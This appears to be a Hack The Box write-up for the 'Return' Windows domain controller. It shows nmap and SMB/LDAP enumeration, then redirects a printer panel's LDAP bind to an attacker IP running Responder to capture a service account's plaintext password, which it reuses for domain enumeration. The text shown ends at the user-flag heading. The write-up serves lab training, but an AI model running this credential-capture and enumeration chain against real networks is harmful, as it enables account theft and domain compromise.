# [return](https://app.hackthebox.com/machines/Return)

> A Windows Active Directory domain controller hosting a web application that allows unauthenticated users to configure the IP address of the server's printer. By changing the IP address to that of an attacker-controlled host, it is possible to retrieve the plaintext credential of a domain user with `SeBackupPrivilege` and `SeRestorePrivilege`. With these privileges, it is possible to read the system flag. The domain user is also in the `Server Operators` group, so it is capable of configuring and restarting arbitrary services on the machine to run an arbitrary payload, even those that run as `NT AUTHORITY/SYSTEM`. The target is also vulnerable to CVE-2021-34527, PrintNightmare, which allows authenticated local and remote privilege escalation.

---

## Open Port Enumeration

```bash
$ sudo masscan -p1-65535 10.129.95.241 --rate=1000 -e tun0 --output-format grepable --output-filename enum/return.masscan
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-12-05 22:45:59 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [65535 ports/host]
$ cat enum/return.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
135,139,3268,3269,389,445,464,47001,49664,49665,49666,49667,49673,49674,49675,49677,49680,49695,53,593,5985,636,80,88,9389,
```

```bash
$ sudo nmap -sC -sV -O -p135,139,3268,3269,389,445,464,47001,49664,49665,49666,49667,49673,49674,49675,49677,49680,49695,53,593,5985,636,80,88,9389,65535 10.129.95.241 -oA enum/return
Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-05 17:56 EST
Nmap scan report for 10.129.95.241
Host is up (0.046s latency).

PORT      STATE  SERVICE       VERSION
53/tcp    open   domain        Simple DNS Plus
80/tcp    open   http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: HTB Printer Admin Panel
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2021-12-05 23:15:08Z)
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds?
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open   mc-nmf        .NET Message Framing
47001/tcp open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49673/tcp open   msrpc         Microsoft Windows RPC
49674/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open   msrpc         Microsoft Windows RPC
49677/tcp open   msrpc         Microsoft Windows RPC
49680/tcp open   msrpc         Microsoft Windows RPC
49695/tcp open   msrpc         Microsoft Windows RPC
65535/tcp closed unknown
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/5%OT=53%CT=65535%CU=31525%PV=Y%DS=2%DC=I%G=Y%TM=61A
OS:D43EE%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10A%TI=I%CI=I%II=I%SS=S
OS:%TS=U)OPS(O1=M54DNW8NNS%O2=M54DNW8NNS%O3=M54DNW8%O4=M54DNW8NNS%O5=M54DNW
OS:8NNS%O6=M54DNNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(
OS:R=Y%DF=Y%T=80%W=FFFF%O=M54DNW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W
OS:=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T
OS:5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=
OS:O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF
OS:=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80
OS:%CD=Z)

Network Distance: 2 hops
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: 18m31s
| smb2-time:
|   date: 2021-12-05T23:16:14
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.76 seconds
```

The target is serving ports 53, 88, 389, and 636, indicating it is most likely a Windows Active Directory domain controller. The banner of the web server on port 80 indicates that it is a printer administrative panel. The output from ports 389 and 636 leak the domain name `return.local`. Add it to the local DNS resolver.

---

## SMB Enumeration

Neither anonymous nor guest logins work.

```bash
$ smbmap -H 10.129.95.241
[+] IP: 10.129.95.241:445       Name: return.local
```

```bash
$ smbmap -u "guest" -p "" -P 445 -H 10.129.95.241
[!] Authentication error on 10.129.95.241
```

---

## LDAP Enumeration

Anyonmous bind doesn't work.

```bash
$ ldapsearch -LLL -x -h 10.129.95.241 -b 'dc=return,dc=local' '(&(objectclass=user)(name=*))' name sAMAccountName description
Operations error (1)
Additional information: 000004DC: LdapErr: DSID-0C090A37, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4563
```

---

## Web Enumeration

The index page of the web application (`/index.php`) indicates that it serves as an admin panel for a printer.

![](images/Pasted%20image%2020211206112654.png)

### Content Discovery

```bash
$ gobuster dir -u http://10.129.95.241 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -x php

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.95.241
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/12/06 17:56:36 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 151] [--> http://10.129.95.241/images/]
/Images               (Status: 301) [Size: 151] [--> http://10.129.95.241/Images/]
/.                    (Status: 200) [Size: 28274]
/IMAGES               (Status: 301) [Size: 151] [--> http://10.129.95.241/IMAGES/]

===============================================================
2021/12/06 17:57:56 Finished
===============================================================
```

### Manual Enumeration

The only valid link in the navigation bar is `Settings`, which redirects to `/settings.php`. This page contains a form that makes it possible to update the address and port of the printer and the username and password used to connect to the printer. The form is already filled in with `printer.return.local` as the address, `389` as the port, `svc-printer` as the username, and `******` as the password.

![](images/Pasted%20image%2020211206113039.png)

Submitting the form results in the following request:

```http
POST /settings.php HTTP/1.1
Host: 10.129.95.241
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 23
Origin: http://10.129.95.241
Connection: close
Referer: http://10.129.95.241/settings.php
Upgrade-Insecure-Requests: 1

ip=printer.return.local
```

---

## Printer Address Update Exploitation

The printer settings update form makes it possible to change the printer's IP address arbitrarily. Perhaps by changing this to an attacker-controlled IP address, the target will make a request to the attacker. Perhaps `responder` can be used to coerce the target into making the request with a credential.

Start `responder`.

```bash
$ sudo responder -I tun0 -rv                                             
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.7.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.49]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-E29J0KOP9QG]
    Responder Domain Name      [OWJ3.LOCAL]
    Responder DCE-RPC Port     [49986]

[+] Listening for events...
```

Submit the form with an attacker-controlled IP address.

```http
POST /settings.php HTTP/1.1
Host: 10.129.95.241
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 14
Origin: http://10.129.95.241
Connection: close
Referer: http://10.129.95.241/settings.php
Upgrade-Insecure-Requests: 1

ip=10.10.14.49
```

The target does indeed reach out and reveal the plaintext password of `svc-printer`: `1edFg43012!!`.

```bash
$ sudo responder -I tun0 -rv                                                                                                                          1 ⨯
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.7.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.14.49]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-E29J0KOP9QG]
    Responder Domain Name      [OWJ3.LOCAL]
    Responder DCE-RPC Port     [49986]

[+] Listening for events...

[LDAP] Attempting to parse an old simple Bind request.
[LDAP] Cleartext Client   : 10.129.95.241
[LDAP] Cleartext Username : return\svc-printer
[LDAP] Cleartext Password : 1edFg43012!!
```

---

## Credentialed SMB Enumeration

There are no non-standard shares on the target. However, `svc-printer` does have write access to `C$`, which generally indicates some kind of elevated privilege.

```bash
$ crackmapexec smb 10.129.95.241 -d return.local -u svc-printer -p '1edFg43012!!' --shares
SMB         10.129.95.241   445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.129.95.241   445    PRINTER          [+] return.local\svc-printer:1edFg43012!!
SMB         10.129.95.241   445    PRINTER          [+] Enumerated shares
SMB         10.129.95.241   445    PRINTER          Share           Permissions     Remark
SMB         10.129.95.241   445    PRINTER          -----           -----------     ------
SMB         10.129.95.241   445    PRINTER          ADMIN$          READ            Remote Admin
SMB         10.129.95.241   445    PRINTER          C$              READ,WRITE      Default share
SMB         10.129.95.241   445    PRINTER          IPC$            READ            Remote IPC
SMB         10.129.95.241   445    PRINTER          NETLOGON        READ            Logon server share
SMB         10.129.95.241   445    PRINTER          SYSVOL          READ            Logon server share
```

---

## Credentialed Domain Enumeration

### Domain Controllers

There is only one domain controller in the domain: `printer.return.local`. The domain controller has Kerberos unconstrained delegation enabled, as all domain controllers do.

```bash
$ pywerview get-netdomaincontroller -w return.local -u svc-printer -p '1edFg43012!!' --dc-ip 10.129.95.241 -d return.local
accountexpires:                9223372036854775807
badpasswordtime:               1600-12-31 19:03:58
badpwdcount:                   0
cn:                            PRINTER
codepage:                      0
countrycode:                   0
displayname:                   PRINTER$
distinguishedname:             CN=PRINTER,OU=Domain Controllers,DC=return,DC=local
dnshostname:                   printer.return.local
dscorepropagationdata:         2021-05-20 13:26:55,
                               1601-01-01 00:00:01
instancetype:                  4
iscriticalsystemobject:        TRUE
isgroup:                       False
lastlogoff:                    1600-12-31 19:03:58
lastlogon:                     2021-12-06 11:36:43.264441
lastlogontimestamp:            132832821835613529
localpolicyflags:              0
logoncount:                    76
msdfsr-computerreferencebl:    CN=WIN-HQU2BCQL89C,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=return,DC=local
msds-additionaldnshostname:    WIN-HQU2BCQL89C$,
                               PRINTER$
msds-generationid:             43,
                               128,
                               237,
                               205,
                               191,
                               178,
                               192,
                               5
msds-supportedencryptiontypes: 28
name:                          PRINTER
objectcategory:                CN=Computer,CN=Schema,CN=Configuration,DC=return,DC=local
objectclass:                   top,
                               person,
                               organizationalPerson,
                               user,
                               computer
objectguid:                    5be175ae-8b61-4eae-b'a206'-b0fca8aafa27
objectsid:                     S-1-5-21-3750359090-2939318659-876128439-1000
operatingsystem:               Windows Server 2019 Standard
operatingsystemversion:        10.0 (17763)
primarygroupid:                516
pwdlastset:                    2021-12-06 11:36:11.139443
ridsetreferences:              CN=RID Set,CN=PRINTER,OU=Domain Controllers,DC=return,DC=local
samaccountname:                PRINTER$
samaccounttype:                805306369
serverreferencebl:             CN=PRINTER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=return,DC=local
serviceprincipalname:          Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/printer.return.local,
                               ldap/WIN-HQU2BCQL89C/RETURN,
                               HOST/WIN-HQU2BCQL89C/return.local,
                               ldap/WIN-HQU2BCQL89C/ForestDnsZones.return.local,
                               HOST/WIN-HQU2BCQL89C/RETURN,
                               ldap/PRINTER/ForestDnsZones.return.local,
                               ldap/WIN-HQU2BCQL89C/DomainDnsZones.return.local,
                               HOST/PRINTER/return.local,
                               ldap/PRINTER/DomainDnsZones.return.local,
                               GC/PRINTER/return.local,
                               ldap/WIN-HQU2BCQL89C/return.local,
                               GC/WIN-HQU2BCQL89C/return.local,
                               ldap/PRINTER/return.local,
                               RestrictedKrbHost/WIN-HQU2BCQL89C,
                               HOST/WIN-HQU2BCQL89C,
                               ldap/WIN-HQU2BCQL89C,
                               HOST/PRINTER/RETURN,
                               ldap/PRINTER/RETURN,
                               ldap/printer.return.local/ForestDnsZones.return.local,
                               ldap/printer.return.local/DomainDnsZones.return.local,
                               DNS/printer.return.local,
                               GC/printer.return.local/return.local,
                               RestrictedKrbHost/printer.return.local,
                               RestrictedKrbHost/PRINTER,
                               HOST/printer.return.local/RETURN,
                               HOST/PRINTER,
                               HOST/printer.return.local,
                               HOST/printer.return.local/return.local,
                               ldap/printer.return.local/RETURN,
                               ldap/PRINTER,
                               ldap/printer.return.local,
                               ldap/printer.return.local/return.local,
                               RPC/c2a9b7bb-a190-4065-b4d6-f373b72005f0._msdcs.return.local,
                               E3514235-4B06-11D1-AB04-00C04FC2DCD2/c2a9b7bb-a190-4065-b4d6-f373b72005f0/return.local,
                               ldap/c2a9b7bb-a190-4065-b4d6-f373b72005f0._msdcs.return.local
useraccountcontrol:            ['SERVER_TRUST_ACCOUNT', 'TRUSTED_FOR_DELEGATION']
usnchanged:                    110634
usncreated:                    12293
whenchanged:                   2021-12-06 16:36:23
whencreated:                   2021-05-20 13:26:54
```

Confirm that the target is the domain controller with a DNS lookup of `printer.return.local`.

```bash
$ nslookup printer.return.local 10.129.95.241
Server:         10.129.95.241
Address:        10.129.95.241#53

Name:   printer.return.local
Address: 10.129.95.241
Name:   printer.return.local
Address: dead:beef::14a
```

### Domain Computers

The target is the only computer in the domain.

```bash
$ pywerview get-netcomputer -w return.local -u svc-printer -p '1edFg43012!!' --dc-ip 10.129.95.241 --full-data
accountexpires:                9223372036854775807
badpasswordtime:               1600-12-31 19:03:58
badpwdcount:                   0
cn:                            PRINTER
codepage:                      0
countrycode:                   0
displayname:                   PRINTER$
distinguishedname:             CN=PRINTER,OU=Domain Controllers,DC=return,DC=local
dnshostname:                   printer.return.local
dscorepropagationdata:         2021-05-20 13:26:55,
                               1601-01-01 00:00:01
instancetype:                  4
iscriticalsystemobject:        TRUE
isgroup:                       False
lastlogoff:                    1600-12-31 19:03:58
lastlogon:                     2021-12-06 11:36:43.264441
lastlogontimestamp:            132832821835613529
localpolicyflags:              0
logoncount:                    76
msdfsr-computerreferencebl:    CN=WIN-HQU2BCQL89C,CN=Topology,CN=Domain System Volume,CN=DFSR-GlobalSettings,CN=System,DC=return,DC=local
msds-additionaldnshostname:    WIN-HQU2BCQL89C$,
                               PRINTER$
msds-generationid:             43,
                               128,
                               237,
                               205,
                               191,
                               178,
                               192,
                               5
msds-supportedencryptiontypes: 28
name:                          PRINTER
objectcategory:                CN=Computer,CN=Schema,CN=Configuration,DC=return,DC=local
objectclass:                   top,
                               person,
                               organizationalPerson,
                               user,
                               computer
objectguid:                    5be175ae-8b61-4eae-b'a206'-b0fca8aafa27
objectsid:                     S-1-5-21-3750359090-2939318659-876128439-1000
operatingsystem:               Windows Server 2019 Standard
operatingsystemversion:        10.0 (17763)
primarygroupid:                516
pwdlastset:                    2021-12-06 11:36:11.139443
ridsetreferences:              CN=RID Set,CN=PRINTER,OU=Domain Controllers,DC=return,DC=local
samaccountname:                PRINTER$
samaccounttype:                805306369
serverreferencebl:             CN=PRINTER,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=return,DC=local
serviceprincipalname:          Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/printer.return.local,
                               ldap/WIN-HQU2BCQL89C/RETURN,
                               HOST/WIN-HQU2BCQL89C/return.local,
                               ldap/WIN-HQU2BCQL89C/ForestDnsZones.return.local,
                               HOST/WIN-HQU2BCQL89C/RETURN,
                               ldap/PRINTER/ForestDnsZones.return.local,
                               ldap/WIN-HQU2BCQL89C/DomainDnsZones.return.local,
                               HOST/PRINTER/return.local,
                               ldap/PRINTER/DomainDnsZones.return.local,
                               GC/PRINTER/return.local,
                               ldap/WIN-HQU2BCQL89C/return.local,
                               GC/WIN-HQU2BCQL89C/return.local,
                               ldap/PRINTER/return.local,
                               RestrictedKrbHost/WIN-HQU2BCQL89C,
                               HOST/WIN-HQU2BCQL89C,
                               ldap/WIN-HQU2BCQL89C,
                               HOST/PRINTER/RETURN,
                               ldap/PRINTER/RETURN,
                               ldap/printer.return.local/ForestDnsZones.return.local,
                               ldap/printer.return.local/DomainDnsZones.return.local,
                               DNS/printer.return.local,
                               GC/printer.return.local/return.local,
                               RestrictedKrbHost/printer.return.local,
                               RestrictedKrbHost/PRINTER,
                               HOST/printer.return.local/RETURN,
                               HOST/PRINTER,
                               HOST/printer.return.local,
                               HOST/printer.return.local/return.local,
                               ldap/printer.return.local/RETURN,
                               ldap/PRINTER,
                               ldap/printer.return.local,
                               ldap/printer.return.local/return.local,
                               RPC/c2a9b7bb-a190-4065-b4d6-f373b72005f0._msdcs.return.local,
                               E3514235-4B06-11D1-AB04-00C04FC2DCD2/c2a9b7bb-a190-4065-b4d6-f373b72005f0/return.local,
                               ldap/c2a9b7bb-a190-4065-b4d6-f373b72005f0._msdcs.return.local
useraccountcontrol:            ['SERVER_TRUST_ACCOUNT', 'TRUSTED_FOR_DELEGATION']
usnchanged:                    110634
usncreated:                    12293
whenchanged:                   2021-12-06 16:36:23
whencreated:                   2021-05-20 13:26:54
```

### Domain Users

`svc-printer` is the only non-standard user in the domain. It is a member of the `Server Operators` and `Print Operators` groups, both of which can be leveraged for privilege escalation.

```bash
$ pywerview get-netuser -w return.local -u svc-printer -p '1edFg43012!!' --dc-ip 10.129.95.241
accountexpires:         0
admincount:             1
badpasswordtime:        2021-09-27 06:46:52.963423
badpwdcount:            0
cn:                     Administrator
codepage:               0
countrycode:            0
description:            Built-in account for administering the computer/domain
distinguishedname:      CN=Administrator,CN=Users,DC=return,DC=local
dscorepropagationdata:  2021-05-20 13:42:04,
                        2021-05-20 13:42:04,
                        2021-05-20 13:26:55,
                        1601-01-01 18:12:16
homedirectory:
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                False
lastlogoff:             1600-12-31 19:03:58
lastlogon:              2021-12-06 11:36:42.483197
lastlogontimestamp:     132832821871082903
logoncount:             48
logonhours:             [255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]
memberof:               CN=Group Policy Creator Owners,CN=Users,DC=return,DC=local,
                        CN=Domain Admins,CN=Users,DC=return,DC=local,
                        CN=Enterprise Admins,CN=Users,DC=return,DC=local,
                        CN=Schema Admins,CN=Users,DC=return,DC=local,
                        CN=Administrators,CN=Builtin,DC=return,DC=local
name:                   Administrator
objectcategory:         CN=Person,CN=Schema,CN=Configuration,DC=return,DC=local
objectclass:            top,
                        person,
                        organizationalPerson,
                        user
objectguid:             16e73777-cbd2-4f7b-b'876a'-7b75e5715a06
objectsid:              S-1-5-21-3750359090-2939318659-876128439-500
primarygroupid:         513
profilepath:
pwdlastset:             2021-07-16 11:03:22.557691
samaccountname:         Administrator
samaccounttype:         805306368
scriptpath:
useraccountcontrol:     ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
usnchanged:             110636
usncreated:             8196
whenchanged:            2021-12-06 16:36:27
whencreated:            2021-05-20 13:25:59

accountexpires:         9223372036854775807
badpasswordtime:        1600-12-31 19:03:58
badpwdcount:            0
cn:                     Guest
codepage:               0
countrycode:            0
description:            Built-in account for guest access to the computer/domain
distinguishedname:      CN=Guest,CN=Users,DC=return,DC=local
dscorepropagationdata:  2021-05-20 13:26:55,
                        1601-01-01 00:00:01
homedirectory:
instancetype:           4
iscriticalsystemobject: TRUE
isgroup:                False
lastlogoff:             1600-12-31 19:03:58
lastlogon:              1600-12-31 19:03:58
logoncount:             0
memberof:               CN=Guests,CN=Builtin,DC=return,DC=local
name:                   Guest
objectcategory:         CN=Person,CN=Schema,CN=Configuration,DC=return,DC=local
objectclass:            top,
                        person,
                        organizationalPerson,
                        user
objectguid:             9279b330-09b1-4315-b'b13c'-c22f5de1ca2d
objectsid:              S-1-5-21-3750359090-2939318659-876128439-501
primarygroupid:         514
profilepath:
pwdlastset:             1600-12-31 19:03:58
samaccountname:         Guest
samaccounttype:         805306368
scriptpath:
useraccountcontrol:     ['ACCOUNTDISABLE', 'PASSWD_NOTREQD', 'NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
usnchanged:             8197
usncreated:             8197
whenchanged:            2021-05-20 13:25:59
whencreated:            2021-05-20 13:25:59

accountexpires:                9223372036854775807
admincount:                    1
badpasswordtime:               1600-12-31 19:03:58
badpwdcount:                   0
cn:                            krbtgt
codepage:                      0
countrycode:                   0
description:                   Key Distribution Center Service Account
distinguishedname:             CN=krbtgt,CN=Users,DC=return,DC=local
dscorepropagationdata:         2021-05-20 13:42:04,
                               2021-05-20 13:26:55,
                               1601-01-01 00:04:16
homedirectory:
instancetype:                  4
iscriticalsystemobject:        TRUE
isgroup:                       False
lastlogoff:                    1600-12-31 19:03:58
lastlogon:                     1600-12-31 19:03:58
logoncount:                    0
memberof:                      CN=Denied RODC Password Replication Group,CN=Users,DC=return,DC=local
msds-supportedencryptiontypes: 0
name:                          krbtgt
objectcategory:                CN=Person,CN=Schema,CN=Configuration,DC=return,DC=local
objectclass:                   top,
                               person,
                               organizationalPerson,
                               user
objectguid:                    6a6a26cf-fcef-4865-b'bf11'-d2115ec754bd
objectsid:                     S-1-5-21-3750359090-2939318659-876128439-502
primarygroupid:                513
profilepath:
pwdlastset:                    2021-05-20 09:26:54.838405
samaccountname:                krbtgt
samaccounttype:                805306368
scriptpath:
serviceprincipalname:          kadmin/changepw
showinadvancedviewonly:        TRUE
useraccountcontrol:            ['ACCOUNTDISABLE', 'NORMAL_ACCOUNT']
usnchanged:                    12788
usncreated:                    12324
whenchanged:                   2021-05-20 13:42:04
whencreated:                   2021-05-20 13:26:54

accountexpires:        9223372036854775807
admincount:            1
badpasswordtime:       2021-12-06 11:55:26.671301
badpwdcount:           1
cn:                    SVCPrinter
codepage:              0
countrycode:           0
description:           Service Account for Printer
displayname:           SVCPrinter
distinguishedname:     CN=SVCPrinter,CN=Users,DC=return,DC=local
dscorepropagationdata: 2021-05-26 08:26:03,
                       2021-05-26 08:15:13,
                       1601-01-01 00:00:00
givenname:             SVCPrinter
homedirectory:
instancetype:          4
isgroup:               False
lastlogoff:            1600-12-31 19:03:58
lastlogon:             2021-05-26 04:39:29.009051
lastlogontimestamp:    132832917781238129
logoncount:            1
memberof:              CN=Server Operators,CN=Builtin,DC=return,DC=local,
                       CN=Remote Management Users,CN=Builtin,DC=return,DC=local,
                       CN=Print Operators,CN=Builtin,DC=return,DC=local
name:                  SVCPrinter
objectcategory:        CN=Person,CN=Schema,CN=Configuration,DC=return,DC=local
objectclass:           top,
                       person,
                       organizationalPerson,
                       user
objectguid:            e52116fd-60d3-480c-b'b17e'-89fc49e52c9b
objectsid:             S-1-5-21-3750359090-2939318659-876128439-1103
primarygroupid:        513
profilepath:
pwdlastset:            2021-05-26 04:15:13.368362
samaccountname:        svc-printer
samaccounttype:        805306368
scriptpath:
useraccountcontrol:    ['NORMAL_ACCOUNT', 'DONT_EXPIRE_PASSWORD']
userprincipalname:     svc-printer@return.local
usnchanged:            110695
usncreated:            20519
whenchanged:           2021-12-06 19:16:18
whencreated:           2021-05-26 08:15:13
```

### Domain Groups

There doesn't appear to be any non-standard groups in the domain.

```bash
$ pywerview get-netgroup -w return.local -u svc-printer -p '1edFg43012!!' --dc-ip 10.129.95.241
samaccountname: Administrators
samaccountname: Users
samaccountname: Guests
samaccountname: Print Operators
samaccountname: Backup Operators
samaccountname: Replicator
samaccountname: Remote Desktop Users
samaccountname: Network Configuration Operators
samaccountname: Performance Monitor Users
samaccountname: Performance Log Users
samaccountname: Distributed COM Users
samaccountname: IIS_IUSRS
samaccountname: Cryptographic Operators
samaccountname: Event Log Readers
samaccountname: Certificate Service DCOM Access
samaccountname: RDS Remote Access Servers
samaccountname: RDS Endpoint Servers
samaccountname: RDS Management Servers
samaccountname: Hyper-V Administrators
samaccountname: Access Control Assistance Operators
samaccountname: Remote Management Users
samaccountname: Storage Replica Administrators
samaccountname: Domain Computers
samaccountname: Domain Controllers
samaccountname: Schema Admins
samaccountname: Enterprise Admins
samaccountname: Cert Publishers
samaccountname: Domain Admins
samaccountname: Domain Users
samaccountname: Domain Guests
samaccountname: Group Policy Creator Owners
samaccountname: RAS and IAS Servers
samaccountname: Server Operators
samaccountname: Account Operators
samaccountname: Pre-Windows 2000 Compatible Access
samaccountname: Incoming Forest Trust Builders
samaccountname: Windows Authorization Access Group
samaccountname: Terminal Server License Servers
samaccountname: Allowed RODC Password Replication Group
samaccountname: Denied RODC Password Replication Group
samaccountname: Read-only Domain Controllers
samaccountname: Enterprise Read-only Domain Controllers
samaccountname: Cloneable Domain Controllers
samaccountname: Protected Users
samaccountname: Key Admins
samaccountname: Enterprise Key Admins
samaccountname: DnsAdmins
samaccountname: DnsUpdateProxy
```

### Domain Graph

```bash
$ bloodhound-python -d return.local -u svc-printer -p '1edFg43012!!' -c All -ns 10.129.95.241
INFO: Found AD domain: return.local
INFO: Connecting to LDAP server: printer.return.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: printer.return.local
INFO: Found 4 users
INFO: Found 51 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: printer.return.local
INFO: Done in 00M 14S
```

As noted in the domain user section above, `svc-printer` is a member of the `Server Operators` and `Print Operators` groups, both of which are capable privilege escalation vectors. `svc-printer` also has `CanPSRemote` access to the target, indicating that its credentials can be used to access the target via WinRM on port 5985.

![](images/Pasted%20image%2020211206133034.png)

---

## User Flag as `svc-printer`

